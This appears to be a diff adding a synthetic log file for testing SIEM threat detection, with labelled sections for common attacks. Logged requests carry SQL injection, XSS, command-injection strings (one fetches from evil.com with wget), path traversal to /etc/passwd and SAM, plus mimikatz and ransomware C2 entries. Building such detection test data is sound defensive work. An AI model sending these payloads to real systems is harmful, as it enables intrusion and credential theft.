@@ -1,0 +1,90 @@
+# Sample Malicious Log File for SIEM Testing
+# This file contains various attack patterns for testing threat detection
+
+# SQL Injection Attempts
+Nov 23 10:15:32 webserver apache: 203.0.113.50 - - [23/Nov/2025:10:15:32] "GET /login.php?user=admin' OR '1'='1 HTTP/1.1" 200 1234
+Nov 23 10:15:45 webserver apache: 203.0.113.50 - - [23/Nov/2025:10:15:45] "POST /search?q='; DROP TABLE users; -- HTTP/1.1" 500 0
+Nov 23 10:16:02 webserver apache: 203.0.113.50 - - [23/Nov/2025:10:16:02] "GET /products?id=1 UNION SELECT password FROM users HTTP/1.1" 200 5678
+
+# XSS Attempts
+Nov 23 10:20:15 webserver apache: 198.51.100.75 - - [23/Nov/2025:10:20:15] "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1" 200 890
+Nov 23 10:20:30 webserver apache: 198.51.100.75 - - [23/Nov/2025:10:20:30] "POST /profile?bio=<iframe src='evil.com'></iframe> HTTP/1.1" 200 1100
+
+# Command Injection
+Nov 23 10:25:10 webserver apache: 198.51.100.75 - - [23/Nov/2025:10:25:10] "GET /api/exec?cmd=ls; cat /etc/passwd HTTP/1.1" 500 0
+Nov 23 10:25:25 webserver apache: 198.51.100.75 - - [23/Nov/2025:10:25:25] "POST /upload?file=test.txt; wget http://evil.com/malware HTTP/1.1" 500 0
+
+# Brute Force Attack
+Nov 23 10:30:01 auth sshd: Failed password for admin from 185.220.101.45 port 5001
+Nov 23 10:30:03 auth sshd: Failed password for admin from 185.220.101.45 port 5002
+Nov 23 10:30:05 auth sshd: Failed password for admin from 185.220.101.45 port 5003
+Nov 23 10:30:07 auth sshd: Failed password for admin from 185.220.101.45 port 5004
+Nov 23 10:30:09 auth sshd: Failed password for admin from 185.220.101.45 port 5005
+Nov 23 10:30:11 auth sshd: Failed password for admin from 185.220.101.45 port 5006
+Nov 23 10:30:13 auth sshd: Failed password for admin from 185.220.101.45 port 5007
+Nov 23 10:30:15 auth sshd: Failed password for root from 185.220.101.45 port 5008
+Nov 23 10:30:17 auth sshd: Failed password for root from 185.220.101.45 port 5009
+Nov 23 10:30:19 auth sshd: Failed password for root from 185.220.101.45 port 5010
+
+# Port Scanning
+Nov 23 10:35:01 firewall kernel: DENY TCP 203.0.113.100:54321 -> 192.168.1.10:21
+Nov 23 10:35:02 firewall kernel: DENY TCP 203.0.113.100:54322 -> 192.168.1.10:22
+Nov 23 10:35:03 firewall kernel: DENY TCP 203.0.113.100:54323 -> 192.168.1.10:23
+Nov 23 10:35:04 firewall kernel: DENY TCP 203.0.113.100:54324 -> 192.168.1.10:80
+Nov 23 10:35:05 firewall kernel: DENY TCP 203.0.113.100:54325 -> 192.168.1.10:443
+Nov 23 10:35:06 firewall kernel: DENY TCP 203.0.113.100:54326 -> 192.168.1.10:3306
+Nov 23 10:35:07 firewall kernel: DENY TCP 203.0.113.100:54327 -> 192.168.1.10:3389
+Nov 23 10:35:08 firewall kernel: DENY TCP 203.0.113.100:54328 -> 192.168.1.10:8080
+Nov 23 10:35:09 firewall kernel: DENY TCP 203.0.113.100:54329 -> 192.168.1.10:8443
+Nov 23 10:35:10 firewall kernel: DENY TCP 203.0.113.100:54330 -> 192.168.1.10:5432
+Nov 23 10:35:11 firewall kernel: DENY TCP 203.0.113.100:54331 -> 192.168.1.10:27017
+Nov 23 10:35:12 firewall kernel: DENY TCP 203.0.113.100:54332 -> 192.168.1.10:6379
+
+# Malware Detection
+Nov 23 10:40:15 endpoint-security antivirus: ALERT Trojan.Generic.12345 detected in C:\Users\john\Downloads\payload.exe
+Nov 23 10:40:30 endpoint-security antivirus: QUARANTINE file C:\Users\john\Downloads\payload.exe
+Nov 23 10:41:00 endpoint-security edr: Suspicious process mimikatz.exe started by user john
+Nov 23 10:41:15 endpoint-security edr: Credential dumping attempt detected from mimikatz.exe
+
+# Path Traversal
+Nov 23 10:45:10 webserver apache: 198.51.100.80 - - [23/Nov/2025:10:45:10] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 0
+Nov 23 10:45:25 webserver apache: 198.51.100.80 - - [23/Nov/2025:10:45:25] "GET /view?path=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1" 403 0
+
+# Data Exfiltration
+Nov 23 10:50:00 database-server postgres: Large data export: 5GB transferred to external IP 185.220.101.45
+Nov 23 10:50:30 network-monitor netflow: Unusual outbound traffic: 10GB uploaded to 185.220.101.45 over 30 minutes
+
+# Lateral Movement
+Nov 23 10:55:10 domain-controller security: User john executed psexec.exe targeting \\DB-SRV-01
+Nov 23 10:55:25 domain-controller security: Remote WMI connection from LAPTOP-JOHN to DB-SRV-01
+Nov 23 10:55:40 domain-controller security: New service created on DB-SRV-01 by user john
+
+# Privilege Escalation
+Nov 23 11:00:05 linux-server auth: User john executed: sudo su -
+Nov 23 11:00:20 linux-server auth: User john modified file permissions: chmod 777 /etc/shadow
+Nov 23 11:00:35 windows-server security: User john added to Administrators group
+
+# Suspicious Tools
+Nov 23 11:05:10 webserver apache: 203.0.113.90 - - [23/Nov/2025:11:05:10] "GET / HTTP/1.1" 200 1234 "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+Nov 23 11:05:25 webserver apache: 203.0.113.90 - - [23/Nov/2025:11:05:25] "GET /admin HTTP/1.1" 404 0 "sqlmap/1.5"
+Nov 23 11:05:40 webserver apache: 203.0.113.90 - - [23/Nov/2025:11:05:40] "GET /login HTTP/1.1" 200 890 "Nikto/2.1.6"
+
+# DDoS Attempt (High Request Rate)
+Nov 23 11:10:01 webserver apache: 198.51.100.200 - - [23/Nov/2025:11:10:01] "GET / HTTP/1.1" 200 1234
+Nov 23 11:10:01 webserver apache: 198.51.100.200 - - [23/Nov/2025:11:10:01] "GET / HTTP/1.1" 200 1234
+Nov 23 11:10:01 webserver apache: 198.51.100.200 - - [23/Nov/2025:11:10:01] "GET / HTTP/1.1" 200 1234
+Nov 23 11:10:02 webserver apache: 198.51.100.200 - - [23/Nov/2025:11:10:02] "GET / HTTP/1.1" 200 1234
+Nov 23 11:10:02 webserver apache: 198.51.100.200 - - [23/Nov/2025:11:10:02] "GET / HTTP/1.1" 200 1234
+# ... (pattern repeats 100+ times)
+
+# Ransomware Indicators
+Nov 23 11:15:10 endpoint-security edr: Mass file encryption detected on LAPTOP-JANE
+Nov 23 11:15:25 endpoint-security edr: Ransomware note created: README_DECRYPT.txt
+Nov 23 11:15:40 endpoint-security edr: Connection to known ransomware C2: evil-site.net
+
+# Normal Activity (for baseline)
+Nov 23 11:20:00 webserver apache: 192.168.1.50 - - [23/Nov/2025:11:20:00] "GET /index.html HTTP/1.1" 200 5432
+Nov 23 11:20:15 auth sshd: Accepted password for admin from 192.168.1.5 port 22
+Nov 23 11:20:30 database postgres: Query executed: SELECT * FROM products WHERE category='electronics'
+Nov 23 11:20:45 backup-system cron: Backup job completed successfully
+Nov 23 11:21:00 system kernel: System update installed: security patch KB2025-001
